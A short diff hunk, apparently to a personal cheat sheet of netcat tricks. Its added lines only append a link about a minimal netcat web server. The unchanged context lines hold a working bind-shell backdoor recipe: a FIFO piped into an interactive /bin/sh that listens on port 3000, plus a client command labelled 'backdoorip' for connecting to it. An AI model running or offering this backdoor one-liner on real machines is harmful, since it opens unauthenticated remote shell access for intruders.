@@ -35,3 +35,5 @@ rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 3000 > /tmp/f   #bash has interesting differences
 client nc backdoorip 3000
 _________________________________________________________________________________
+Web minimal
+https://stackoverflow.com/questions/16640054/minimal-web-server-using-netcat
